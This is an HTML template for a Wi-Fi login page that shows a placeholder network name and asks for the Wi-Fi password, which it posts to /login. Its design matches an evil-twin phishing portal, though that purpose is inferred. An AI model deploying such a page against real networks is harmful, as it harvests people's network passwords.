<!DOCTYPE html>
<html lang="en">
<head>
    <title>{ssid} Wi-Fi Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap 5.3 CSS -->
    <link href="/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Bootstrap Icons -->
    <!-- <link rel="stylesheet" href="/font/bootstrap-icons.css"> -->

    <!-- Custom CSS -->
    <style>
        .btn-purple {
            background-color: #6f42c1;
            border-color: #6f42c1;
            color: white;
        }
        .btn-purple:hover {
            background-color: #5a32a3;
            border-color: #5a32a3;
            color: white;
        }
        .text-purple {
            color: #6f42c1 !important;
        }
        .password-toggle {
            cursor: pointer;
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            z-index: 5;
        }
        .password-wrapper {
            position: relative;
        }
        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
        }
    </style>
</head>
<body class="bg-light">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6 col-lg-4">
                <div class="card shadow-sm">
                    <div class="card-body p-4 text-center">
                        <div class="mb-4">
                            <i class="bi bi-wifi text-purple" style="font-size: 3rem;"></i>
                        </div>
                        <h2 class="h4 mb-3">{ssid}</h2>
                        <p class="text-muted mb-4">Please enter the Wi-Fi password to connect</p>

                        <form method="POST" action="/login">
                            <div class="mb-3 password-wrapper">
                                <input type="password" id="passwordField" class="form-control form-control-lg" name="password" placeholder="Wi-Fi Password" required>
                                <i class="bi bi-eye-slash password-toggle text-secondary" id="togglePassword"></i>
                            </div>
                            <button type="submit" class="btn btn-purple btn-lg w-100">
                                Connect
                            </button>
                        </form>

                        <div class="mt-4 text-muted small">
                            <p>By connecting, you agree to our Terms of Service</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap 5.3 JS Bundle with Popper -->
    <script src="/js/bootstrap.bundle.min.js"></script>

    <!-- Password Toggle Script -->
    <script>
        document.getElementById('togglePassword').addEventListener('click', function() {
            const passwordField = document.getElementById('passwordField');
            const icon = this;

            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                icon.classList.remove('bi-eye-slash');
                icon.classList.add('bi-eye');
            } else {
                passwordField.type = 'password';
                icon.classList.remove('bi-eye');
                icon.classList.add('bi-eye-slash');
            }
        });
    </script>
</body>
</html>
